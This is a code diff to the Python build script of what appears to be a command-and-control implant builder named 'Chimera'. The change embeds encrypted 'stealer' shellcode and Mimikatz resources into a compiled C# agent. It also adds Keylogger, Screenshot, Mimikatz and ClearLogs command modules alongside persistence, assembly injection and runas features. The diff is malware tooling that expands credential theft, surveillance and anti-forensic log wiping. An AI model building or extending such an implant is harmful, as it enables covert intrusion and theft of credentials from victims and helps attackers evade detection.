@@ -54,13 +54,12 @@ class Chimera(PayloadType):
             with open(f"{build_dir}/Config.cs", "w") as f:
                 f.write(config_content)
 
-            # stealer_enc: optional XOR-encrypted shellcode blob for run_stealer command.
-            # Place the file at agent_code/stealer_enc before building if you want it embedded.
-            # If it doesn't exist, the binary builds fine but run_stealer will report "not found".
-            stealer_enc_path = f"{build_dir}/stealer_enc"
-            res_flag = []
-            if os.path.exists(stealer_enc_path):
-                res_flag = [f"/res:{stealer_enc_path},stealer_enc"]
+            # Optional embedded resources — only bundled if the file exists in agent_code/
+            res_flags = []
+            for res_name in ["stealer_enc", "mimikatz_enc"]:
+                res_path = f"{build_dir}/{res_name}"
+                if os.path.exists(res_path):
+                    res_flags.append(f"/res:{res_path},{res_name}")
 
             mcs_cmd = [
                 "mcs",
@@ -68,9 +67,13 @@ class Chimera(PayloadType):
                 "-platform:x86",
                 "-out:/tmp/chimera.exe",
                 "-r:System.Net.Http.dll",
+                "-r:System.Drawing.dll",
+                "-r:System.Management.dll",
+                "-r:System.ServiceProcess.dll",
                 f"{build_dir}/Program.cs",
                 f"{build_dir}/Config.cs",
                 f"{build_dir}/C2Http.cs",
+                f"{build_dir}/Staging.cs",
                 f"{build_dir}/Tasking.cs",
                 f"{build_dir}/StringHelper.cs",
                 f"{build_dir}/Commands/Shell.cs",
@@ -85,7 +88,12 @@ class Chimera(PayloadType):
                 f"{build_dir}/Commands/Persist.cs",
                 f"{build_dir}/Commands/InjectAssembly.cs",
                 f"{build_dir}/Commands/RunasExec.cs",
-            ] + res_flag
+                f"{build_dir}/Commands/Screenshot.cs",
+                f"{build_dir}/Commands/Keylogger.cs",
+                f"{build_dir}/Commands/Ps.cs",
+                f"{build_dir}/Commands/Mimikatz.cs",
+                f"{build_dir}/Commands/ClearLogs.cs",
+            ] + res_flags
 
             result = subprocess.run(
                 mcs_cmd,
